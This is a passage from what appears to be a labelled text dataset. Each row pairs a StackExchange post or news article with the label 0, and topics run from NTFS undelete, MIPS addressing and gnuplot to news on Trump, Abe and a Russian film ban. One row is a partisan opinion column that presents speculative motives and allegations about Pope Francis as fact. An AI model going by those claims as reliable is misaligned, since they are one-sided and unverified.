And the Wikipedia page you linked to doesn't ever use the adjective ""non-local"". It's something you added (unfortunately, popular books and pop-science articles do so all the time) and it is not correct.</p>

<p>Otherwise for a given choice of ""type of the experiment"" that you called $x$ or $y$, the projection operators always commute with each other. For two different values of $x$ but the same experimenter (e.g. both Alice), the projection operators generally don't commute, at least some of them don't. Otherwise they wouldn't be different. If all of the projection operators of Alice's for the values of $x_1$ and $x_2$ commuted with all others, one could unify these measurements into one and remove e.g. $x_2$ from the list of choices for $x$.</p>

<p>When one minimizes the sets of possible ""types of measurement"" and tries to minimize the dimension of the Hilbert spaces, he may find the usual examples of entangled states such as Bell's inequality or CHSH that qualitatively differ from any local hidden variable model in some qualitative way, and those can't be reduced further.</p>
",0
"<p>Undeleting files on an <a href=""http://en.wikipedia.org/wiki/NTFS#Internals"" rel=""noreferrer"">NTFS</a> volume is not as simple as flipping one bit.
It is true that the difference between a deleted and non-deleted file is just one
bit in the MFT, but one needs also to recover the file's contents, which are stored as streams,
as well as re-flag the deleted sectors as used in the $Bitmap pseudo-file which contains
one bit per sector,
each bit indicates whether its corresponding cluster is used (allocated) or free (available for allocation).</p>

<p>The complexity of the job is such that all recovery tools prefer not to write to the
damaged volume. For example, marking a sector in $Bitmap as used may cause cross-chaining
if that sector was already used by another file.</p>

<p>This article demonstrated the problem very well with hex dumps :<br>
<a href=""http://html5.litten.com/windows-file-recovery-series-part-5-manually-recover-a-deleted-file-from-an-ntfs-file-system/"" rel=""noreferrer"">Windows ‘File Recovery’ series : Part 5 Manually Recover a Deleted File From an NTFS File System</a>.</p>

<p>Another article even contains the source code of a program that could be modified
to unflip the ""deleted"" bit : 
<a href=""http://www.codeproject.com/Articles/9293/Undelete-a-file-in-NTFS"" rel=""noreferrer"">Undelete a file in NTFS</a>.</p>

<p>There are quite a few NTFS disk editors that can edit the MFT to flip that bit.
Some that I found via Google (but luckily never needed to use) are :<br>
<a href=""http://www.winhex.com/disk-editor.html"" rel=""noreferrer"">WinHex</a><br>
<a href=""http://www.ntfs.com/recovery-toolkit.htm"" rel=""noreferrer"">NTFS Data Recovery Toolkit</a><br>
<a href=""http://dmde.com/"" rel=""noreferrer"">DMDE</a><br>
<a href=""http://www.disk-editor.org/"" rel=""noreferrer"">Freeware Active Disk Editor</a></p>

<p>A possible solution which might even work would be to undo the deleted bit in the MFT,
then use the chkdsk utility to try to recover the contents.
This utility can recover the sectors-chains of files whose sectors were wrongly marked as
available for reallocation and will fix up $Bitmap.</p>

<p><strong>However, there is always the chance that this procedure may destroy your disk.</strong></p>

<p>This is why you and all the commentators above (including myself) have not found any product that does in-place recovery. The possibilities for screwing up your disk are simply
too much for anybody who is not a Microsoft employee working on NTFS.</p>

<p>My best recommendation for you is to get a second hard disk and recover the files on it.
I believe you have found out that one backup disk is not enough.
I have already had several cases of friends asking me to recover their only backup,
and I always counsel them (sometimes too late) to have two backup disks.</p>

<p>In addition, at least one of the two backup disks should be disconnected from the computer.
I advise this after hearing of a case where a computer has fried itself and every
connected USB device, leaving the owner with no data and no backup in one hit.</p>
",0
"<p>When you create an object in Oracle with double quotes, Oracle creates that objects with the same case as you entered it. Try dropping the ""insert_family""   procedure and creating it without the double quotes.</p>

<p>This should help.</p>

<pre><code>SQL&gt; CREATE TABLE family
  2       ( NAME          VARCHAR2(25),
  3         NICK_NAME     VARCHAR2(15),
  4         GENDER        CHAR(1),
  5         AGE           NUMBER(3),
  6         MARITL_STATUS VARCHAR2(15),
  7         QUALIFICTN    VARCHAR2(20),
  8         NO_OF_CHLDRN  NUMBER(2) );

Table created.

SQL&gt;
SQL&gt; create or replace procedure ""insert_family""
  2     ( NAME varchar2 ,
  3       NICK_NAME varchar2 ,
  4       GENDER VARCHAR2,
  5       AGE number,
  6       MARITL_STAUS varchar2,
  7       QUALIFICTN varchar2,
  8       NO_OF_CHLDRN number)
  9  is
 10  begin
 11  insert into family values(NAME,NICK_NAME,GENDER,AGE,MARITL_STAUS,QUALIFICTN,NO_OF_CHLDRN);
 12  end;
 13  /

Procedure created.

SQL&gt;
SQL&gt; create or replace procedure ""Insert_family""
  2     ( NAME varchar2 ,
  3       NICK_NAME varchar2 ,
  4       GENDER VARCHAR2,
  5       AGE number,
  6       MARITL_STAUS varchar2,
  7       QUALIFICTN varchar2,
  8       NO_OF_CHLDRN number)
  9  is
 10  begin
 11  insert into family values(NAME,NICK_NAME,GENDER,AGE,MARITL_STAUS,QUALIFICTN,NO_OF_CHLDRN);
 12  end;
 13  /

Procedure created.

SQL&gt;
SQL&gt; create or replace procedure ""iNsert_family""
  2     ( NAME varchar2 ,
  3       NICK_NAME varchar2 ,
  4       GENDER VARCHAR2,
  5       AGE number,
  6       MARITL_STAUS varchar2,
  7       QUALIFICTN varchar2,
  8       NO_OF_CHLDRN number)
  9  is
 10  begin
 11  insert into family values(NAME,NICK_NAME,GENDER,AGE,MARITL_STAUS,QUALIFICTN,NO_OF_CHLDRN);
 12  end;
 13  /

Procedure created.

SQL&gt;
SQL&gt; create or replace procedure ""inSert_family""
  2     ( NAME varchar2 ,
  3       NICK_NAME varchar2 ,
  4       GENDER VARCHAR2,
  5       AGE number,
  6       MARITL_STAUS varchar2,
  7       QUALIFICTN varchar2,
  8       NO_OF_CHLDRN number)
  9  is
 10  begin
 11  insert into family values(NAME,NICK_NAME,GENDER,AGE,MARITL_STAUS,QUALIFICTN,NO_OF_CHLDRN);
 12  end;
 13  /

Procedure created.

SQL&gt;
SQL&gt; exec insert_family('AYUSH','SHUKLA','MALE',12,'UNMARRIED','SCHOOL',0);
BEGIN insert_family('AYUSH','SHUKLA','MALE',12,'UNMARRIED','SCHOOL',0); END;

      *
ERROR at line 1:
ORA-06550: line 1, column 7:
PLS-00201: identifier 'INSERT_FAMILY' must be declared
ORA-06550: line 1, column 7:
PL/SQL: Statement ignored


SQL&gt; select object_name, object_type, status from user_objects where upper(object_name)=upper('inSert_family') order by 1;

OBJECT_NAME                    OBJECT_TYPE          STATUS
------------------------------ -------------------- ------------
Insert_family                  PROCEDURE            VALID
iNsert_family                  PROCEDURE            VALID
inSert_family                  PROCEDURE            VALID
insert_family                  PROCEDURE            VALID

4 rows selected.
</code></pre>
",0
"<p>When it comes to FELs, 'fastest' tends to refer to the length of the pulse, i.e. you're not interested in the speed at which the pulse propagates (which is obviously always $c$), but at how short an interval of time you can compress the energy into, as the pulse passes some pre-established target.</p>

<p>In general, free-electron lasers are able to produce some of the shortest pulses of light available, but they do tend to suffer somewhat from temporal jitter, which means that the pulses' length and timing are not as consistent as you would like. (That then means that the shortest available pulses of light, which also have a higher timing stability, are produced via <a href=""https://en.wikipedia.org/wiki/High_harmonic_generation"" rel=""nofollow noreferrer"">high-harmonic generation</a>, which strictly speaking isn't a laser, but a laser-driven parametric process.) The timing-jitter problem can be solved by providing the FEL with a 'seed': a low-energy pulse of light with a higher coherence and stability, that the FEL can then amplify. This can be done in one of two ways:</p>

<ul>
<li>one can use a pulse from an HHG source, which provides the best coherence properties, and which is currently only in use at the <a href=""https://www.elettra.trieste.it/lightsources/fermi/machine.html"" rel=""nofollow noreferrer"">FERMI</a> light source at the Elettra synchrotron in Trieste; or</li>
<li>one can use a weaker FEL pulse as a seed, which the DESY team has been working on for some time and which they <a href=""http://accelconf.web.cern.ch/AccelConf/ipac2017/papers/wepab016.pdf"" rel=""nofollow noreferrer"">recently started reporting</a>.</li>
</ul>

<p>The news you heard refer to the opening of the European XFEL, which is <a href=""http://www.xfel.eu/overview/in_comparison"" rel=""nofollow noreferrer"">an improved version of the seeded FLASH facility</a> at DESY.</p>

<p>When it comes to the use of terms like ""fastest"", there's always a substantial amount of give in what does and doesn't count. As an example, single attosecond pulses produced via HHG can <a href=""http://dx.doi.org/10.1038/nphoton.2013.362"" rel=""nofollow noreferrer"">go below the 70 attosecond mark</a>, much shorter and much more stable than seeded FELs (for comparison, the European XFEL specs claim pulses as short as 1 fs, though I would suspect there's significant timing jitter at that end of the range), but FEL people might want to dismiss them via technicalities (""they're not an actual laser"") or on other figures of merit (FEL pulses are brighter) that make the comparisons that much more subjective. As such, it's normally safe to assume that when making those claims, the organization has bent some definitions so that they benefit them over their competitors.</p>

<p>Nevertheless, the sFLASH and European XFEL capabilities at DESY do represent a significant advance worth celebrating, and they do make us much more capable of producing short pulses (that are also useful in other aspects) than we were before them. That's what the 'fast' means in those news reports.</p>
",0
"<p><a href=""https://stackoverflow.com/questions/4216752/anyone-having-any-leads-on-a-reading-time-algorithm"">There is a similar question</a>, so I will add a bit over the answer.  </p>

<p>There are too many factors independent of language but solely based on individual reading abilities that such estimate would not be possible.<br>
I assume perfect text without spelling errors and unclear grammar.</p>

<p>Giving it a try:<br>
People can read 20, 50, 200, 2000... pages per hour, it depends on reading skills - only prescreening test will give you answer to that: give 2 pages, measure time, or use eye tracker and do the same.</p>

<p>This depends on language used, but the reading speed is measured in native language, so the differences are in the next point as for language (or decrease the speed for non-native by... proficiency at that language).</p>

<p>People use <a href=""https://en.wikipedia.org/wiki/Cohort_model"" rel=""nofollow noreferrer"">Cohorts</a> imagine that the dictionary forms trie, and the speed of recognizing given word depends on amount of words with the same prefix.<br>
<em>Cognitive Psychology: A Student's Handbook, fifth edition</em> by Michael W. Eysenck,Mark T. Keane, page 347.</p>

<p>For example: ""Av..."" What are possible words?<br>
Average, Avalanche... Avengers if someone seen the movie, comics or ads.<br>
""Ave.."" - word on it's own, Average fits, Avengers also.<br>
If person reads about statistics, ""average"" is already good choice, about Roman Empire - Ave it is, about movies played - Avengers.<br>
But reading continues to the next syllabe.  </p>

<p>It depends on mood, recent readings, coherence of text, familiarity with topic, recent topics seen (not only read).  </p>

<p>About topic: reading novel is faster than technical text. Technical text for someone proficient will not decrease reading speed.<br>
So the task given is important, if someone is checked for understanding text, reading speed decreases.</p>

<p>The language itself is not a factor, you should not take mean reading speed but median of your target group.<br>
Yes age is factor, but not that usable as it gives fraction of other factors.</p>

<p>With dyslexia the decrease also vary per person, $30%$ decrease is very optimistic case.</p>

<p><em>Theory and Research in Learning Disabilities</em> by J.P. Das, R.F. Mulcahy and A.E. Wall, page 179.</p>

<p>I would take into account understanding of text, with dyslexia simple, short statements are easier to cope than longer sentences.  </p>

<p>In any case taking syllabes count, average sentence length, topic, statistical occurence of word in e.g. books, magazines, movies, spoken language, difficulty of text (taken as topic and uncommon words).</p>

<p>There are a lot more factors, but giving the general idea that it is not sufficient to just calculate it from text is presented.</p>

<p>The best estimate for personalised result - measure per person and store the result, honestly the best you can do.  </p>

<p>You can try <em>The Psychology of Reading</em> by K. Rayner and A. Pollatsek.</p>
",0
"<p>First of all, to short circuit your question, I must say that you can not ready from multiple memory locations at the same time in the MIPS architecture.</p>

<p>Second, your interpretation of the offset is wrong. You assumed the offset is a bit offset, while it's actually an offset in bytes. Meaning if you give the address 2 and offset 4, the memory location to be read from will be 6 (2+4).</p>

<p>Third, more details into the MIPS lw (load word) instruction. The syntax is as follow:
lw  \$d, off(\$r), where \$d is the destination register (where the word is loaded to), off is an immediate 32 bit constant and \$r is your base register. What happens is as follow: </p>

<ol>
<li>The target ram address is calculated by adding off and the value in \$r.</li>
<li>The calculated address in loaded in the memory register</li>
<li>The control unit enabled the RAM to get the value at the address</li>
<li>The value is set to the \$d register</li>
</ol>

<p>Fourth, something I haven't mentioned before, related to the addressing pattern of the ram. As you may know, the ram stores bytes, no actual words. What's the problem you may wonder? It's something called word alignment, and it's the reason why you couldn't load a word from address 6. A word is a 4 byte value, and for fast design purposes, when loading a word, the address has to be a multiple of 4. I won't go in the design details, but suffice to say that this permits greater memory transfer speed than allowing any address.</p>

<p>What this means is that when loading and storing words, you have to respect the word boundaries. If you try to read from a bad memory location i.e. not a multiple of 4, e.g. 6, you will have a memory exception; meaning you program likely crashes.</p>

<p>In practice, this mean that if you have to store tree words a,b and c, you could store them at address 0x01234560, 0x01234564 and 0x01234568.</p>

<p><strong>EXTRA: why use an offset</strong></p>

<p>So, in my last example, you might have noticed my words were close in memory, but i didn't start at 0x00000000. Actually, the first word starts at adress 0x01234560. Here's how you can take that into consideration with the lw syntax.</p>

<ol>
<li>First, set the value of \$r to 0x01234560</li>
<li>Then, to load a, you write lw \$d, 0(\$r). The will load the value at 0+\$r, 0 + 0x01234560 = 0x01234560</li>
<li>Then, to load b, you write lw \$d, 4(\$r). The will load the value at 4+\$r, 4 + 0x01234560 = 0x01234564</li>
<li>Then, to load c, you write lw \$d, 8(\$r). The will load the value at 8+\$r, 8 + 0x01234560 = 0x01234568</li>
</ol>

<p>I hope this completely answers your question. The only thing I haven't touched is why you'd end up at such complex memory locations. Short answer: it's due to the structure of the compiled program and the way it's loaded into memory. I suggest you look further into that before delving deeper into the world of computer electronics. A sound knowledge of the structure of a program will greatly help understand why the CPU and instruction set were made that way.</p>
",0
"Pope Francis threw himself into the middle of an already overheated Republican presidential race when he questioned frontrunner Donald Trump’s Christian faith. [Pope Franics made it appear as if his unprecedented remarks were motivated simply by a concern over Trump’s goal of building a wall along the U. S.  border, but I have little doubt the pope’s broadside has less to do with whether or not there should be a border wall and more about pandering to Mexican Catholics.  In fact, the pope is taking on Trump to boost his own popularity with Mexican Catholics and also to divert attention away from long simmering questions about the Mexican church’s relationship with narco donations. Because the Catholic Church is struggling to stem defections among Mexican Catholics to Pentecostal Christian sects, the pope came prepared to demonstrate he was a friend of working class Mexicans. The American political debate over illegal immigration was tailor made for pontifical sound bites. By diverting attention to a brawl with Trump, the pope can continue avoiding a peculiar problem in Mexico: huge cash donations to the Mexican church from cartel bosses.  The dirty donations are so common they are called narco limosnas (narco alms). No money laundering laws are violated so long as the Mexican clerics do not kick back any of the cash to the traffickers, but it is a problem the U. S. government has pleaded with the Church to address.  Attacking Trump’s faith is about as good a diversion as possible to avoid having to tackle narco alms. Pope Francis likes to wear a reformer’s mantle.  In going after Trump, he said, “A person who thinks only about building walls, wherever they may be, and not of building bridges  …    . this is not in the gospel. ” When I heard that, I could only think of the fact that Pope Francis has steadfastly refused all public calls to open the Vatican’s Holocaust files and bank records from World War II.  This issue is particularly timely because of evidence that the Vatican may have profited during World War II through secret investments in German and Italian insurers, and that those companies reaped outsized profits by escheating the life insurance policies of Jews sent to the death camps. When he was the cardinal of Buenos Aires, he said those files should be opened.  Now, as pope, he has avoided the issue. The pope’s criticism of Donald Trump could apply to the Vatican’s own intransigence over its wartime archives.  “Building walls” (or in other words keeping the files under lock and key inside the Secret Archives) instead “of building bridges” (opening the archives to historians) is “not the gospel. ” No one, of course, questions Pope Francis’s faith as a Christian simply because he is not tackling   or opening up the secret Holocaust files. The same should apply to political candidates.  The pope is free to disagree with any politician, but to interfere in American politics is likely a misstep.  And to do so with a moral judgment about faith violates a secular and religious red line that should be sacrosanct.",0
"Jennifer Lawrence opened up about feminism, her   essay on the gender wage gap in Hollywood, and her belief that society should create a “new normal” body type in a   interview in April’s Harper’s Bazaar. [“I don’t know why that word (feminism) is so scary to people. It shouldn’t be, because it just means equality,” the    Hunger Games actress told the magazine. “If we are moving forward in a society, you are feeling stronger as a woman, and you want to be taken more seriously. You don’t have to take away the wonderful traits that come with being a woman. ”  “We are sensitive. We are pleasers. We’re empathetic,” Lawrence added. “All those things that can keep you from asking for what you want or making mistakes. ” Lawrence, who earned a Best Actress Oscar for 2012’s Silver Linings Playbook and has been nominated for the award three other times, has quickly become one of the most   actresses in Hollywood. She is also one of the richest, topping Forbes magazine’s list of the   actresses in 2015 with $52 million in earnings. The actress said she was “embarrassed to be from Kentucky” after Christian county clerk Kim Davis was jailed for refusing to issue a marriage license to a   couple. The previous month, Lawrence penned an essay for Lena Dunham’s Lenny newsletter on the gender pay gap in Hollywood, in which she blasted the studio filmmaking system for paying male actors more than women for the same amount of work. The essay earned her praise from Hillary Clinton and from fellow actors and actresses like Bradley Cooper and Emma Watson. “There’s nothing wrong with being a pleaser if you’re smart about it. As long as you’re getting what’s fair,” Lawrence told Harper’s Bazaar. “You know, I want my employers to be happy. I want to please anyone I’m working for as long as they pay me the appropriate amount. I’ll make them as happy as they want. ” In her interview, Lawrence also took aim at what she believes are unrealistic expectations for people’s bodies, an issue she has sounded off on before. In 2013, Lawrence said that the media “needs to take responsibility” for the effect that disparaging people’s body types has on the younger generation’s  . “I would like us to make a new   type,” Lawrence told HB. “Everybody says, ‘We love that there is somebody with a normal body!’ And I’m like, ‘I don’t feel like I have a normal body.’ I do Pilates every day. I eat, but I work out a lot more than a normal person. ” “I think we’ve gotten so used to underweight that when you are a normal weight, it’s like, ‘Oh, my God, she’s curvy.’ Which is crazy,” she added. “The bare minimum, just for me, would be to up the ante. At least so I don’t feel like the fattest one. ” Lawrence will be seen next in this summer’s  : Apocalypse, and later this year in the   thriller Passengers, alongside Chris Pratt. The actress’ gender pay gap essay may have struck a chord at Sony, the studio behind Passengers Lawrence is reportedly set to receive $20 million for the movie, while Pratt will get $12 million. Follow Daniel Nussbaum on Twitter: @dznussbaum",0
"<p>See updated question below!:</p>

<p><strong><em>(1 Old stuff)</em></strong>
I have the following code:</p>

<pre><code>clear
reset
unset key
# Make the x axis labels easier to read.
set xtics rotate out
# Select histogram data
set style data histogram
# Give the bars a plain fill pattern, and draw a solid line around them.
set style fill solid border

set title ""Intensity of luxA signal for different substances""

set output 'luxA.png'
set terminal png transparent nocrop enhanced font times 18 size 840,640 

set ylabel ""Intensität""

set style histogram

plot 'luxA.dat' using 2:xticlabels(1)
</code></pre>

<p>And the following data:</p>

<pre><code>Name    Value   Color
""SN wt"" 1103    blue
""SN ΔΔ"" 124.3333333333  blue
""SN -A"" 367.3333333333  blue
""SN -B"" 147.3333333333  blue
""10nM C100"" 325.6666666667  red
""200nM C100""    207.3333333333  red
""300nM C100""    236.6666666667  red
""LB""    180.6666666667  green
""LuxX""  168 green
""only LB""   62  green
""only MQ""   64.6666666667   green
""LB&amp;wt"" 65.3333333333   green
""SN LuxX&amp;wt""    73  green
</code></pre>

<p>I want to color every bar according to the column ""Color"".</p>

<p>It also would be nice, if I could group the different groups a bit closer spatially (smaller distances within group and bigger between groups).</p>

<p><strong><em>(2 New questions and data)</em></strong></p>

<p>New data (fourth line for error bars (deviation)):</p>

<pre><code>Name    Value   Color   Deviation
""SN wt"" 1103    #006400 61.0
""SN ΔΔ"" 124.3333333333  #006400 3.21
""SN -CI""    367.3333333333  #006400 25.38
""SN -B"" 147.3333333333  #006400 20.74
""10nM C8""   325.6666666667  #0000FF 20.13
""200nM C8""  207.3333333333  #0000FF 28.7
""300nM C8""  236.6666666667  #0000FF 35.91
""1uM BDSF""  596.6666666667  #0000C6 44.12
""10uM BDSF"" 545.3333333333  #0000C6 102.01
""15uM BDSF"" 547 #0000C6 33.60
""1uM DSF""   596.3333333333  #00008B 98.47
""10uM DSF""  532 #00008B 21
""15uM DSF""  653.6666666667  #00008B 13.65
""LB""    180.6666666667  grey    20.13
""LuxA""  168 grey    20.07
""only LB""   62  grey    9.54
""only MQ""   64.6666666667   grey    20.03   
""LB \\&amp; wt"" 65.3333333333   grey    3.79
""SN Lux \\&amp; wt"" 73  grey    14.53
</code></pre>

<p>--> With this I want basically to achieve what I described above, but with error bars. The solution suggested below works for the colors, but not for the spacing on my computer (Ubuntu, gnuplot 4.4 patchlevel 2) And it is done with boxes? Is it possible to add error bars to boxes. I am a bit lost, I know C and Python but this gnuplot syntax scares my a bit... :-(</p>

<p>So I would like to have:
- Bars according to color
- Same groups (according color) grouped spatially together (small spacing in group, large spacing among groups)
- Error bars according to column 4 (I do not care if it is done with boxes or with histogram, as long as it works :-| )
- The solution from mgilson (Thanks a lot!) for the spacing gives me an error (See below). What am I doing wrong? I use it exactly as stated...</p>

<p>By the way: What is your favourite gnuplot book out there?</p>
",0
"<p>I try to understand a proof in <em>More Concise Algebraic Topology: Localization, completions and model categories</em> by May &amp; Ponto (<a href=""http://www.math.uchicago.edu/~may/TEAK/KateBookFinal.pdf"" rel=""nofollow noreferrer"">pdf</a>). The proof is on page 262, and it is for the statement</p>

<blockquote>
  <p>Any map $f:X\to Y$ factors as the composite of an acyclic cofibration and a fibration</p>
</blockquote>

<p>The authors proceed as follows. Let $Z_0=X$ and $\rho_0=f$. We assume inductively that we have constructed a map $\rho_n:Z_n\to Y$. We define $N\rho_n$ as the pullback of $Y^I\to Y\leftarrow Z_n$. Where the first map is $\varepsilon_0$ (evaluation at $0$). The composite $N\rho_n\to Y^I\to Y$ can also be written as $N\rho_n\to N\rho_n\times I\to Y$ where the first map is inclusion at $0$ and the second map is the adjunct of the map $N\rho_n\to Y^I$. If we now define $Z_{n+1}$ as the pushout of $N\rho_n\times I\leftarrow N\rho_n\to Z_n$, this induces a unique map $\rho_{n+1}:Z_{n+1}\to Y$ making certain triangles commute. For the first $n$, I have displayed the various arising maps in the following diagram. I hope it's not too confusing, the arrows must be thought of as evolving towards the front for increasing $n$.<br>
<img src=""https://i.stack.imgur.com/Q1ksH.png"" alt=""enter image description here""><br>
Let $Z$ be the colimit of the sequence $Z_0\hookrightarrow Z_1\hookrightarrow \dots$, with $\nu:Z_0\hookrightarrow Z$ the initial inclusion into this colimit. Since all the maps $\nu_n$ are acyclic cofibrations, so is $\nu$. If $\rho:Z\to Y$ denotes the map induced by the $\rho_n$, then $\rho\nu=f$, so it suffices to show that $\rho$ is a fibration. This is the case if in the following square there is a lift, where $N\rho$ is the pullback of the diagram $Y^I\to Y\leftarrow Z$.<br>
<img src=""https://i.stack.imgur.com/l9m1d.png"" alt=""enter image description here""><br>
One can show that, since we are working in the category of weak Hausdorff $k$-spaces, the canonical map $\text{colim}N\rho_n\to N\rho$ is a homeomorphism. Also, $\text{colim}(N\rho_n\times I)\cong N\rho\times I$. This way, the map $N\rho\to Z$ is the colimit of the maps $N\rho_n\to Z_n$. So practically all the objects in the square are colimits. Now according to the authors, the diagonal is induced by the maps $\lambda_n:N\rho_n\to Z_{n+1}$. Here comes the point I am doubtful about: I don't see why the square with $\lambda_0$ and $\lambda_1$ commutes.</p>

<p>In fact, I'm pretty sure it does not commute: A point in $N\rho_0\times I$ is of the form $(q,z, t)$, which by the map $\lambda_0$ is sent to its equivalence class and then via $\nu_1$ to the class represented by $\left(\overline{q(t)},(q,z,t),0\right)$ (where the bar denotes constant path) while $(q,z,t)$ is sent via the other map to $\left(q,\left(\overline{\rho_0(z)},z,0\right),t\right)$
and then via $\lambda_1$ to that element's equivalence class in $Z_2$.</p>

<p>Is there any way how one could use the constructions of pushouts and pullbacks to acquire the desired lift?</p>
",0
"Prime Minister Shinzo Abe is the first foreign leader scheduled to meet American   Donald Trump. The two are expected to meet in person on November 17, an arrangement made today via teleconference. [The Japanese news outlet Kyodo reported today that Japanese officials confirmed the conversation between Abe and Trump, following Trump’s electoral victory on Tuesday. The conversation, Chief Cabinet Secretary Yoshihide Suga told reporters Thursday, “marks a very good start for building trust” between the two world leader. “Today (the two) have just agreed to meet. It’s important to first build up personal trust and talk about basic things,” he added.  Japan is a key American ally Japan, not possessing its own formal military, depends on America for many of its defense needs.   The conversation allegedly lasted around 20 minutes and culminated with a promise to meet again. Abe is expected to travel to the United States next week on his way to Peru for   Economic Cooperation (APEC) summit there. Abe is one of ten heads of state, not including American President Barack Obama, at press time who have spoken to   Trump, congratulating him and opening the bilateral line of communications. Trump has spoken to the leaders of Egypt, Ireland, Mexico, Israel, Turkey, India, Japan, Australia, the UK and South Korea. A working relationship with Turkey’s head of state, Recep Tayyip Erdogan, may be the most difficult yet necessary to develop, as Turkey has   its way into playing a role in fighting the Islamic State in Syria and Iraq.   Abe’s conversation with Trump in part attempted to assuage the fears of many Japanese people who have expressed concerns about Trump’s   policies during the course of the campaign. A whopping 88 percent of Japanese voters preferred Democratic rival Hillary Clinton to Donald Trump, the South China Morning Post reported, many concerned that Trump would scale back military involvement in the   region, leaving Japan vulnerable to an increasingly belligerent China. “At some point we have to say, you know what, we’re better off if Japan protects itself against this maniac in North Korea,” Trump said in March, implying that he may be open to the possibility of allowing Japan to develop nuclear weapons in   rather than relying on the U. S. military. “We are supporting them, military, and they pay us a fraction, a fraction of what they should be paying us, and of the cost. We are supporting Japan. ” Trump mulled the possibility of spending less money on   for both Japan and South Korea. “We consider that what a candidate said during a political campaign can be different from what the candidate will actually do after taking office,” a Japanese official told The Japan Times of those concerns. “There may be some issues over specific policies, but the basic relations between the two countries won’t change. ” The response in Japan to these remarks at the time, according to national newspaper Asahi Shimbun, was “bewilderment and unease. ” Foreign Minister Fumio Kishida called the idea of a nuclear Japan “impossible. ”  ",0
"<p>I am trying to understand why there is significance difference in the performance of two proposed solutions. </p>

<p>Original question (<a href=""https://math.stackexchange.com/questions/1120402/constraint-minimization-of-sum-of-non-symmetric-matrices/1120596#1120596"">Constraint minimization of sum of Non-symmetric matrices</a>)</p>

<p>\begin{equation}
\begin{array}{c}
\text{min} \hspace{4mm}  \big(\lambda_1\left(  \mathbf{y}^T V_{(1)}\mathbf{x} \right)^2 + \lambda_2\left(  \mathbf{y}^T V_{(2)}\mathbf{x} \right)^2\big) \\
s.t \hspace{10mm}\|\mathbf{x}\|_2 = 1 \\
 \hspace{17mm}\|\mathbf{y}\|_2 = 1,
\end{array}
\end{equation}</p>

<p>where $\mathbf{x} \in \mathbb{R}^{m}$,$\mathbf{y} \in \mathbb{R}^{n}$, $\mathbf{V}_{i} \in \mathbb{R}^{n\times m}$. Also $\lambda_1\geq \lambda_2\geq 0$.</p>

<p>Both solutions are iterative and run same algorithm.The only difference is in the matrices. </p>

<p>Approach 1:</p>

<p>\begin{equation}
\begin{array}{c}
\big(\lambda_1\left(  \mathbf{y}^T V_{(1)}\mathbf{x} \right)^2 + \lambda_2\left(  \mathbf{y}^T V_{(2)}\mathbf{x} \right)^2\big) = 
\lambda_1\left(  \mathbf{y}^T V_{(1)}\mathbf{x}\mathbf{x}^T({V}^T_{(1)}) \mathbf{y}\right) + \lambda_2\left(  \mathbf{y}^T V_{(2)}\mathbf{x}\mathbf{x}^T({V}^T_{(2)}) \mathbf{y} \right) = \mathbf{y}^T \mathbf{Z}_x \mathbf{y}
\end{array}
\end{equation}</p>

<p>\begin{equation}
\begin{array}{c}
\big(\lambda_1\left(  \mathbf{y}^T V_{(1)}\mathbf{x} \right)^2 + \lambda_2\left(  \mathbf{y}^T V_{(2)}\mathbf{x} \right)^2\big) = 
\lambda_1\left(\mathbf{x}^T {V}^T_{(1)})^T \mathbf{y}\mathbf{y}^T{V}_{(1)}\mathbf{x}\right) + \lambda_2\left(\mathbf{x}^T {V}^T_{(2)}\mathbf{y}\mathbf{y}^T{V}_{(2)} \mathbf{x}\right)= \mathbf{x}^T \mathbf{Z}_y \mathbf{x}
\end{array}
\end{equation}</p>

<p>Approach 2:</p>

<p>\begin{equation}
\mathbf{B}_y=\begin{bmatrix} \sqrt{\lambda_1}y_k^T V^{(1)} \\ \sqrt{\lambda_2}y_k^T V^{(2)} \end{bmatrix}\\
\mathbf{B}_x=\begin{bmatrix} \sqrt{\lambda_1} V^{(1)} x_{k+1} &amp; \sqrt{\lambda_2} V^{(2)}x_{k+1}\end{bmatrix} 
\end{equation}</p>

<p>Algorithm: 
Make an initial guess for $\mathbf{x}_k,\mathbf{y}_k$ for$k=0$ and run for $k=0,1,2,…$ until a predefined minimum value is achieved. </p>

<p>Step 1: Use initial guess for $\mathbf{y}$ to compute $\mathbf{Z}_y$ (approach 1) or $\mathbf{B}_y$ (approach 2). Use SVD and take the singular vector corresponding to least singular value as $\mathbf{x}_+$.</p>

<p>Step 2: Update $\bar{x}=x_k+\alpha(x_+-x_k)$, $x_{k+1}=\|\bar{x}\|^{-1}\bar{x}$</p>

<p>Step 3: $\mathbf{\bar{x}}$ from step 1 to compute $\mathbf{Z}_x$ (approach 1) or $\mathbf{B}_x$ (approach 2). Use SVD and take the singular vector corresponding to least singular value as decide $\mathbf{y}_+$.</p>

<p>Step 4: update $\bar{y}=y_k+\beta(y_+-y_k)$, $y_{k+1}=\|\bar{y}\|^{-1}\bar{y}$</p>

<p>My observation: Approach 2 always works better that approach 1 but I don't understand how $\mathbf{B}_x,\mathbf{B}_y$ are define. Is it some standard approach that I can learn. </p>

<p>I would appreciate if someone can make a contribution here.  </p>
",0
"Moscow (CNN) A Russian lawmaker has urged that country’s government to ban Disney’s new ”Beauty and the Beast” remake after labeling it ”a blatant, shameless propaganda of sin and perverted sexual relationships.” The complaint was detailed in a letter sent by Vitaly Milonov to the Culture Minister Vladimir Medinsky and reported by   news agency Ria Novsti. It says the movie should not be shown in Russia if the ministry found ”elements of propaganda of homosexuality.” The Ministry of Culture has not yet issued a ruling on the film, which stars Emma Watson and is scheduled to open in Russia March 16. The movie is rated PG and is a   remake of the 1991 animated hit. Its director, Bill Condon, has said the character of LeFou, fawning sidekick to the villainous Gaston, has an ”exclusively gay moment” in the film.  At the end of the film, there’s a huge celebratory dance    the kind where everyone’s in a big circle and regularly changes partners. On one of these changes, LeFou finds himself paired with another man. They freeze, surprised, in their ”embrace.” The audience laughs and then the camera cuts away. That’s it    the moment is over in less than a second. Russia’s   climate, Russia’s government passed legislation in 2013 prohibiting the spreading of ”gay propaganda” among minors. The law, which described homosexuality as ”  sexual relations,” bars the public discussion of gay rights and relationships anywhere children might hear it.  The move drew fierce criticism from the international gay community and human rights groups across the world. Laws which banned homosexuality in Russia were revoked in 1993 after the collapse of the Soviet Union. But it was not until 1999 that homosexuality in Russia was dropped from a list of psychiatric disorders. Milonov has been the driving force behind Russia’s   laws. As a lawmaker with the ruling United Russia party, he ensured the legislation was first passed in his home city of St. Petersburg before it was adopted across the country. In the past, he has called lesbian, gay, bisexual and transgender people ”sick” and ”crazy.” Milonov also was a supporter of a new Russian law that decriminalizes some forms of domestic violence. Controversy in the US, Milonov’s comments come after a   theater in Alabama announced it would not show the new ”Beauty and the Beast” movie because of its 